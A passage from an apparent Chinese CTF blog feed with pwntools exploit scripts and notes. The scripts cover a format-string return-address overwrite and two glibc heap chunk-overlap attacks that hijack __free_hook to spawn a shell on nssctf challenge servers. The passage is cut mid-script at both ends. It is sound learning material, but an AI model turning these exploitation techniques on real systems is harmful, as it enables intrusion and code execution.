class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/vuln&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *0x4015D2</span></span><br><span class="line"><span class="string">        b *0x401638</span></span><br><span class="line"><span class="string">        b *0x4016A9</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="number">29245</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    sa(<span class="string">b&#x27;say?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x98</span>)</span><br><span class="line">    libc_base = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ed5c0</span></span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;(Y/n)&#x27;</span>,<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">    s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">    stack = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    lg(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">    ret_addr = stack - <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;(Y/n)&#x27;</span>,<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">    s(p64(ret_addr)+p64(ret_addr+<span class="number">2</span>)+p64(ret_addr+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;(Y/n)&#x27;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">    og = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">    og = og[<span class="number">1</span>] + libc_base</span><br><span class="line">    </span><br><span class="line">    c1 = og &amp; <span class="number">0xffff</span></span><br><span class="line">    c2 = ((og &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) + <span class="number">0x10000</span></span><br><span class="line">    c3 = ((og &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) + <span class="number">0x20000</span></span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(c1).encode()+<span class="string">b&#x27;c%8$hn&#x27;</span></span><br><span class="line">    pd += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(c2 - c1).encode()+<span class="string">b&#x27;c%9$hn&#x27;</span></span><br><span class="line">    pd += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(c3 - c2).encode() + <span class="string">b&#x27;c%10$hn&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;for you: &#x27;</span>,pd) <span class="comment"># 8</span></span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      
      <comments>http://example.com/2024/07/30/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>chunk extend and overlapping</title>
      <link>http://example.com/2024/07/28/chunk-extend-overlapping/</link>
      <guid>http://example.com/2024/07/28/chunk-extend-overlapping/</guid>
      <pubDate>Sun, 28 Jul 2024 08:03:46 GMT</pubDate>
      
      <description>&lt;p&gt;堆扩展之向上重叠与向下重叠&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>堆扩展之向上重叠与向下重叠</p><span id="more"></span><h3 id="向上重叠"><a href="#向上重叠" class="headerlink" title="向上重叠"></a>向上重叠</h3><h4 id="巅峰极客-2022-smallcontainer"><a href="#巅峰极客-2022-smallcontainer" class="headerlink" title="[巅峰极客 2022]smallcontainer"></a>[巅峰极客 2022]smallcontainer</h4><p>版本是glibc2.27，对size的检查并不严谨</p><p>通过check函数造成的off by null 实现 chunk extend 和 chunk overlap</p><p>伪造堆块的prev_size域，进行chunk extend</p><p>切割unsortbin，进行chunk overlap</p><h4 id="学到的点："><a href="#学到的点：" class="headerlink" title="学到的点："></a>学到的点：</h4><p>check将\x11变为\x00时会导致chunk的大小变小，需要在chunk尾部布置堆块</p><p>free的chunk进入unsortbin时会先检查prev_size域，如果prev_size不为空，就会将本chunk的地址减掉prev_size，得到前一个chunk的首地址，并检查其是否被释放，如下图(第一个chunk是tcache，不算入，chunk编号从0开始)</p><p>free+900处，会检查前一个chunk是否被释放，方式是检查其大小与其下一个chunk的prev_size域是否相等，在此处，我是直接释放了伪造的chunk3，没有对其前一个chunk0进行释放，所以这里会跳转到free+2120报错</p><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-1.png"></p><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-2.png"></p><p>在对伪造堆块的前一个chunk进行伪造伪造时，我试过对chunk0和chunk1进行释放，chunk0可以，chunk1却不行，因为不太清楚unsortbin的检查机制，所以就调试了一下，为什么chunk1会不行</p><p>这里对chunk1的下一个chunk(chunk2)进行inuse的检查，因为chunk2是freed的状态，就会进行下一步检查</p><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-3.png"></p><p>检查chunk3的prev_size域，此时chunk3是我们伪造的堆块，其prev_size域大小是0x600，而chunk2是0x200</p><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-4.png"></p><p>所以会报错</p><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-5.png"></p><p>然后chunk0前后的chunk都是used状态，所以就不会有这些额外的检查，所以总结的一点就是在这种情况下尽量布置堆块前后都没被释放，会避免很多麻烦</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>最后用one_gadget和system都是可以的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/service&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *$rebase(0x1531)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28421</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size)) <span class="comment">#0x100 ~ 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): <span class="comment"># 0-2</span></span><br><span class="line">        add(<span class="number">0x1f8</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x208</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 4-10</span></span><br><span class="line">        add(<span class="number">0x1f8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 4-10</span></span><br><span class="line">        free(i+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x11</span>))</span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f8</span>) <span class="comment"># off by null</span></span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f0</span> + p64(<span class="number">0x600</span>)) <span class="comment"># chunk overlap</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x200</span>) <span class="comment"># 0</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x3ec190</span></span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x200</span>) <span class="comment"># 3</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x211</span>)+p64(free_hook))</span><br><span class="line">    add(<span class="number">0x200</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">0x200</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">    og = [<span class="number">0x4f29e</span>, <span class="number">0x4f2a5</span>, <span class="number">0x4f302</span>, <span class="number">0x10a2fc</span>]</span><br><span class="line">    og = og[<span class="number">2</span>] + libc_base</span><br><span class="line">    edit(<span class="number">3</span>,p64(og))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit(3,p64(system_addr))</span></span><br><span class="line">    <span class="comment"># edit(2,b&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">    <span class="comment"># free(2)</span></span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h3 id="向下重叠"><a href="#向下重叠" class="headerlink" title="向下重叠"></a>向下重叠</h3><h4 id="巅峰极客-2022-Gift"><a href="#巅峰极客-2022-Gift" class="headerlink" title="[巅峰极客 2022]Gift"></a>[巅峰极客 2022]Gift</h4><p>漏洞点是uaf和bargain可以输入负数从而修改heap地址</p><p>先在第一个堆块中伪造一个fack chunk，要大于0x408 (tcache的最大值)</p><p>前面加上0xb0是因为使后面在分割unsortbin的时候能够修改到 fd 指针 (这点不是很重要，不加的话就知道为什么了)</p><p>重点是伪造堆块的过程</p><h4 id="伪造堆块"><a href="#伪造堆块" class="headerlink" title="伪造堆块"></a>伪造堆块</h4><p>首先，在第一个chunk中伪造一个0x421的fack chunk</p><p>然后看fack chunk的位置，通过bargain函数将fd指针修改到这</p><p>0x330-0x260 &#x3D; 0xd0  这里要注意tcache存的地址不包括chunk头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>)) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">bargain(<span class="number">2</span>, -<span class="number">0xd0</span>)</span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-6.png"></p><p>然后就是看fack chunk在哪里结束 0x320 + 0x420 &#x3D; 0x740</p><p>所以我们就需要再申请几个堆块，直到能在0x740这个位置布置堆块</p><p>可以看到申请到chunk6时就可以在0x740中写入另一个fack chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># 4  fack</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)) <span class="comment"># 6</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-7.png"></p><p>伪造后堆块布局如下，这样我们释放fack chunk的时候就能够绕过检查了</p><p><img src="/imgs/$%7Bfiilename%7D/chunk-extend-and-overlapping-8.png"></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p>释放后fack chunk进入unsortbin泄露地址，选择malloc(0x60)可以切割unsortbin，然后正常的劫持free_hook为one_gadget即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/service2&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *$rebase(0x001234)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28814</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_leak</span>(<span class="params"><span class="built_in">bytes</span>=<span class="number">6</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bytes</span> == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> u32(r(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(r(<span class="built_in">bytes</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a, drop=<span class="literal">True</span>)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;your choice:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">choose, content=<span class="string">b&#x27;aaaa&#x27;</span></span>):  <span class="comment"># &lt; 10</span></span><br><span class="line">    choice(<span class="number">2</span>) </span><br><span class="line">    sla(<span class="string">&#x27;your choice:&#x27;</span>,<span class="built_in">str</span>(choose)) <span class="comment"># 1:0x100 2:0x60</span></span><br><span class="line">    sa(<span class="string">&#x27;your gift!&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bargain</span>(<span class="params">idx, num</span>):</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;How much?&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>)) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">1</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    bargain(<span class="number">2</span>, -<span class="number">0xd0</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">1</span>) <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">1</span>) <span class="comment"># 4  fack</span></span><br><span class="line">    add(<span class="number">1</span>) <span class="comment"># 5</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)) <span class="comment"># 6</span></span><br><span 